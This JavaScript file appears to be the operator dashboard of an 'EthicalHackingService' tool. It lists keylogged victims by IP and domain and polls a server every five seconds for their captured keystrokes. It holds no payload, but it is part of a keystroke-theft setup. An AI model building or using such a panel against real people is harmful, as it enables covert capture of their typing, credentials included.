(function() {	
	$("#logDate").datepicker({
		  dateFormat: "yy-mm-dd"
	}).attr('readonly','readonly');
	$("#keylogUserTable").hide();
	$("#detailedKeylogTable").hide();
	$("#errorMessage").html("");
	$("#successMessage").html("");

	$("#keylogUserForm").submit(function(e) {
		$("#errorMessage").html("");
		$("#successMessage").html("");
		$("#keylogUserTable").hide();
		$("#keylogUserTable tbody").empty();

		var form = $(this);
		var url = form.attr('action');
		var method = form.attr('method');
		$.ajax({
			type : method,
			url : url,
			data : form.serialize(),
			success : function(response) {
				if (response.status == "success") {
					var keyloggedUserList = response.data;
					for (var i = 0; i < keyloggedUserList.length; i++) {
						var buttonReference = encodeHtml($(`[name='logDate']`).val()) + " | " + encodeHtml(keyloggedUserList[i].clientIP) + " | " + encodeHtml(keyloggedUserList[i].domain);
						$("#keylogUserTable tbody").append("<tr><td class='col-md-3'>"
								+ encodeHtml(keyloggedUserList[i].clientIP)
								+ "</td><td class='col-md-3'>"
								+ encodeHtml(keyloggedUserList[i].domain)
								+ "</td><td class='col-md-3'>"
								+ "<button class='btn btn-primary btn-xs' onclick=\"showKeylogs('" + buttonReference
								+ "')\" data-toggle='modal' data-target='#keylogModal'>"
								+ "Show Keylogs</button>"
								+ "</td><td class='col-md-3'>"
								+ "<button class='btn btn-primary btn-xs' onclick=\"showDetailedKeylogs('" + buttonReference
								+ "')\" data-toggle='modal' data-target='#detailedKeylogModal'>"
								+ "Detailed Keylogs</button>"
								+"</td></tr>"
						)
					}
					$("#keylogUserTable").show();
				} else {
					$("#errorMessage").html(encodeHtml(response.data));
				}
			},
			error : function(xhr) {
				if(xhr.status == 401) {
					location.href = location.protocol + '//' + location.host + '/EthicalHackingService';
				}
			}
		});
		e.preventDefault();
	});
	
// $('#keylogModal').on('shown.bs.modal', function (e) {
// alert("modalshown");
// alert(e.getAttribute('id'));
// });
	
	$('#keylogModal').on('hidden.bs.modal', function () {
		$("#keylogModalBody textarea").html("");
		$("#errorMessage").html("");
		clearInterval(keylogsRefreshIntervalId);
	});
	
	$('#detailedkeylogModal').on('hidden.bs.modal', function () {
		$("#detailedKeylogTable").hide();
		$("#detailedKeylogTable tbody").empty();
		$("#errorMessage").html("");
		clearInterval(detailedKeylogsRefreshIntervalId);
	});

})();

var keylogsRefreshIntervalId;
var detailedKeylogsRefreshIntervalId;

function showKeylogs(data) {
	$("#keylogModalTitle").html(encodeHtml(data));
	
	var buttonText = data.split(" | ");
	fetchKeylogs(buttonText[0], buttonText[1], buttonText[2]);
	keylogsRefreshIntervalId = setInterval(function(){fetchKeylogs(buttonText[0], buttonText[1], buttonText[2])},5000);
}

function fetchKeylogs(logDate, clientIP, domain) {
		$.ajax({
			type : "POST",
			url : "AppController",
			data : "requestType=getKeylogs&logDate=" + logDate + "&clientIP=" + clientIP + "&domain=" + domain,
			success : function(response) {
				$("#errorMessage").html("");
				$("#keylogModalBody textarea").html("");
				if (response.status == "success") {
					$("#keylogModalBody textarea").html(encodeHtml(response.data));
				} else {
					$("#errorMessage").html(encodeHtml(response.data));
				}
			},
			error : function(xhr) {
				if(xhr.status == 401) {
					location.href = location.protocol + '//' + location.host + '/EthicalHackingService';
				}
			}
		});
}

function showDetailedKeylogs(data) {
	$("#detailedKeylogModalTitle").html(encodeHtml(data));
	
	var buttonText = data.split(" | ");
	fetchDetailedKeylogs(buttonText[0], buttonText[1], buttonText[2]);
	detailedKeylogsRefreshIntervalId = setInterval(function(){fetchDetailedKeylogs(buttonText[0], buttonText[1], buttonText[2])},5000);
}

function fetchDetailedKeylogs(logDate, clientIP, domain) {
	$.ajax({
		type : "POST",
		url : "AppController",
		data : "requestType=getDetailedKeylogs&logDate=" + logDate + "&clientIP=" + clientIP + "&domain=" + domain,
		success : function(response) {
			$("#errorMessage").html("");
			$("#detailedKeylogTable").hide();
			$("#detailedKeylogTable tbody").empty();
			if (response.status == "success") {
				var keyloggedUserList = response.data;
				for (var i = 0; i < keyloggedUserList.length; i++) {
					$("#detailedKeylogTable tbody").append("<tr><td class='col-md-6'>"
							+ encodeHtml(keyloggedUserList[i].page)
							+ "</td><td class='col-md-3'>"
							+ encodeHtml(keyloggedUserList[i].pressedKey)
							+ "</td><td class='col-md-3'>"
							+ encodeHtml(keyloggedUserList[i].createdDate)
							+"</td></tr>"
					)
				}
				$("#detailedKeylogTable").show();
			} else {
				$("#errorMessage").html(encodeHtml(response.data));
			}
		},
		error : function(xhr) {
			if(xhr.status == 401) {
				location.href = location.protocol + '//' + location.host + '/EthicalHackingService';
			}
		}
	});
}